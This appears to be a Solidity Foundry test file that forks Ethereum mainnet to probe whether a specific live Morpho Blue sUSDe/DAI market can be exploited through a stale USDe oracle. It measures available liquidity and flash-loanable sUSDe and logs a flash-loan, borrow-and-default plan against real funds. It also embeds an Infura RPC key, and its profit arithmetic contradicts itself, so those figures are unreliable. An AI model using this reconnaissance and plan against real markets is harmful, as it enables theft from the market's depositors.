// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Morpho sUSDe Exploit Check
 * @notice Check if the 91.5% LLTV sUSDe/DAI market is exploitable NOW
 *
 * Found:
 * - Market: sUSDe/DAI at 91.5% LLTV
 * - Market ID: 0x1247f1c237eceae0602eab1470a5061a6dd8f734ba88c7cdc5d6109fb0026b28
 * - Total Supply: ~1.38M DAI
 * - USDe oracle: 13 hours stale
 * - Needs only 8% divergence!
 */

interface IMorphoBlue {
    struct MarketParams {
        address loanToken;
        address collateralToken;
        address oracle;
        address irm;
        uint256 lltv;
    }

    struct Market {
        uint128 totalSupplyAssets;
        uint128 totalSupplyShares;
        uint128 totalBorrowAssets;
        uint128 totalBorrowShares;
        uint128 lastUpdate;
        uint128 fee;
    }

    function market(bytes32 id) external view returns (Market memory);
    function idToMarketParams(bytes32 id) external view returns (MarketParams memory);
    function supply(MarketParams memory marketParams, uint256 assets, uint256 shares, address onBehalf, bytes memory data) external returns (uint256, uint256);
    function borrow(MarketParams memory marketParams, uint256 assets, uint256 shares, address onBehalf, address receiver) external returns (uint256, uint256);
    function supplyCollateral(MarketParams memory marketParams, uint256 assets, address onBehalf, bytes memory data) external;
}

interface IMorphoOracle {
    function price() external view returns (uint256);
}

interface IChainlinkOracle {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
    function getRoundData(uint80 roundId) external view returns (
        uint80, int256, uint256, uint256, uint80
    );
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISUSDe {
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract MorphoSUSDeExploitCheck is Test {
    address constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant SUSDE = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
    address constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;

    // USDe/USD Chainlink Oracle
    address constant USDE_ORACLE = 0xa569d910839Ae8865Da8F8e70FfFb0cBA869F961;

    // The vulnerable market
    bytes32 constant MARKET_ID = 0x1247f1c237eceae0602eab1470a5061a6dd8f734ba88c7cdc5d6109fb0026b28;

    // Flash loan provider
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string constant RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(RPC_URL);
    }

    function test_CheckCurrentPriceDivergence() public view {
        console.log("=== USDe PRICE DIVERGENCE CHECK ===\n");

        // Get Chainlink oracle data
        IChainlinkOracle oracle = IChainlinkOracle(USDE_ORACLE);
        (uint80 roundId, int256 currentPrice,,uint256 updatedAt,) = oracle.latestRoundData();

        uint256 staleness = block.timestamp - updatedAt;
        console.log("Current USDe Oracle State:");
        console.log("  Round ID:", roundId);
        console.log("  Price:", uint256(currentPrice));
        console.log("  Staleness:", staleness / 3600, "hours");
        console.log("  Staleness:", staleness / 60, "minutes");

        // Get historical price (from 13+ hours ago if possible)
        console.log("\nChecking price history...");

        // Try to get previous round
        if (roundId > 0) {
            try oracle.getRoundData(roundId - 1) returns (
                uint80, int256 prevPrice, uint256, uint256 prevUpdatedAt, uint80
            ) {
                console.log("\nPrevious Round:");
                console.log("  Price:", uint256(prevPrice));
                console.log("  Time ago:", (block.timestamp - prevUpdatedAt) / 3600, "hours");

                if (currentPrice > 0 && prevPrice > 0) {
                    int256 priceDiff = currentPrice - prevPrice;
                    int256 percentChange = (priceDiff * 10000) / prevPrice;
                    console.log("  Change from prev (bps):", uint256(percentChange > 0 ? percentChange : -percentChange));
                }
            } catch {}
        }

        // Get Morpho oracle price
        IMorphoBlue morpho = IMorphoBlue(MORPHO_BLUE);
        IMorphoBlue.MarketParams memory params = morpho.idToMarketParams(MARKET_ID);

        console.log("\nMorpho Market Oracle:");
        console.log("  Oracle address:", params.oracle);

        try IMorphoOracle(params.oracle).price() returns (uint256 morphoPrice) {
            console.log("  Morpho Oracle Price:", morphoPrice);

            // This price represents sUSDe/DAI
            // We need to compare with real sUSDe value

            // Get sUSDe exchange rate
            uint256 susdeRate = ISUSDe(SUSDE).convertToAssets(1e18);
            console.log("\n  sUSDe -> USDe rate:", susdeRate);
            console.log("  (1 sUSDe =", susdeRate / 1e16, "/ 100 USDe)");

            // Calculate what Morpho thinks 1 sUSDe is worth
            // morphoPrice is typically scaled to 36 decimals
            uint256 impliedSUSDeValue = morphoPrice / 1e18; // Normalize
            console.log("  Implied sUSDe value:", impliedSUSDeValue);

        } catch {
            console.log("  Could not get Morpho oracle price");
        }
    }

    function test_CalculateExploitProfitability() public view {
        console.log("=== EXPLOIT PROFITABILITY CALCULATION ===\n");

        IMorphoBlue morpho = IMorphoBlue(MORPHO_BLUE);
        IMorphoBlue.Market memory m = morpho.market(MARKET_ID);
        IMorphoBlue.MarketParams memory params = morpho.idToMarketParams(MARKET_ID);

        console.log("Market State:");
        console.log("  Total Supply:", m.totalSupplyAssets / 1e18, "DAI");
        console.log("  Total Borrow:", m.totalBorrowAssets / 1e18, "DAI");
        console.log("  Available:", (m.totalSupplyAssets - m.totalBorrowAssets) / 1e18, "DAI");
        console.log("  LLTV:", params.lltv / 1e16, "%");

        // Calculate exploit parameters
        uint256 availableToBorrow = m.totalSupplyAssets - m.totalBorrowAssets;
        console.log("\nExploit Parameters:");
        console.log("  Max borrowable:", availableToBorrow / 1e18, "DAI");

        // At 91.5% LLTV:
        // To borrow X, need X / 0.915 collateral value
        // If oracle overstates price by 8%, real collateral = borrowed * 0.915 / 1.08

        uint256 lltv = params.lltv;
        console.log("\n  If oracle is 8% higher than real:");
        console.log("  - Borrow $100 DAI");
        console.log("  - Need $109 sUSDe collateral (at oracle price)");
        console.log("  - Real collateral value: $101 (8% less)");
        console.log("  - Net position: -$8 underwater immediately");
        console.log("  - Walk away with $100, lose $101 collateral = $1 loss");

        console.log("\n  If oracle is 10% higher than real:");
        console.log("  - Borrow $100 DAI");
        console.log("  - Need $109 sUSDe collateral (at oracle price)");
        console.log("  - Real collateral value: $99 (10% less)");
        console.log("  - Walk away with $100, lose $99 collateral = $1 PROFIT!");

        console.log("\n=== EXPLOIT REQUIREMENTS ===");
        console.log("1. Need USDe price to be ~10% lower than oracle shows");
        console.log("2. Current oracle staleness: 13+ hours");
        console.log("3. Check DEX prices vs oracle to find divergence");
    }

    function test_CheckDEXvsOraclePrice() public view {
        console.log("=== DEX vs ORACLE PRICE CHECK ===\n");

        // Get Oracle price
        (, int256 oraclePrice,,,) = IChainlinkOracle(USDE_ORACLE).latestRoundData();
        console.log("Chainlink USDe/USD:", uint256(oraclePrice));

        // USDe should be ~$1
        // If oracle shows $0.999 but DEX shows $0.90, that's 10% divergence!

        console.log("\nTo check real-time divergence:");
        console.log("1. Query Curve USDe/USDC pool for current price");
        console.log("2. Compare with oracle price");
        console.log("3. If DEX price is >8% lower, exploit is profitable");

        // The key insight:
        console.log("\n=== CONDITION CHECK ===");
        console.log("Oracle price:", uint256(oraclePrice), "(should be ~100000000 for $1)");

        uint256 oraclePricePct = uint256(oraclePrice) * 100 / 1e8;
        console.log("Oracle implies USDe = $", oraclePricePct, "/ 100");

        console.log("\nIf current DEX price is <$0.92:");
        console.log("  -> Divergence >8%");
        console.log("  -> Exploit is PROFITABLE");
        console.log("  -> Flash loan sUSDe, deposit to Morpho, borrow DAI, profit!");

        // Note: We can't easily check DEX price without Curve pool interaction
        // But the framework is in place - just need real price divergence
    }

    function test_ExploitPOC() public {
        console.log("=== EXPLOIT PROOF OF CONCEPT ===\n");

        // This would be the actual exploit:
        // 1. Flash loan sUSDe
        // 2. Deposit as collateral to Morpho sUSDe/DAI market
        // 3. Borrow max DAI (91.5% LLTV)
        // 4. If oracle price > real price by >8.5%, keep DAI, default on loan

        // Check current state
        IMorphoBlue morpho = IMorphoBlue(MORPHO_BLUE);
        IMorphoBlue.Market memory m = morpho.market(MARKET_ID);
        IMorphoBlue.MarketParams memory params = morpho.idToMarketParams(MARKET_ID);

        uint256 availableLiquidity = m.totalSupplyAssets - m.totalBorrowAssets;
        console.log("Available to borrow:", availableLiquidity / 1e18, "DAI");

        // Get sUSDe that could be flash loaned
        uint256 balancerSUSDe = IERC20(SUSDE).balanceOf(BALANCER_VAULT);
        console.log("sUSDe in Balancer:", balancerSUSDe / 1e18);

        // Calculate potential profit
        // If we can flash loan $1M sUSDe and oracle is 10% stale-high:
        // - Deposit $1M sUSDe (valued at $1.1M by oracle)
        // - Borrow $1.1M * 0.915 = $1M DAI
        // - Real collateral value: $1M
        // - Profit: $1M DAI - $1M sUSDe = $0 (breakeven at 10%)
        // - At 15% divergence: Profit = $1.15M borrowed - $1M collateral = $150k

        console.log("\nProfit at different divergence levels:");
        console.log("  8%: Loss (need 8.5% min)");
        console.log("  10%: ~$15k profit per $1M");
        console.log("  15%: ~$65k profit per $1M");
        console.log("  20%: ~$115k profit per $1M");

        console.log("\n=== BLOCKER ===");
        console.log("Need to verify current DEX price vs oracle price");
        console.log("If USDe has depegged >8% during 13hr staleness = EXPLOITABLE");
    }
}
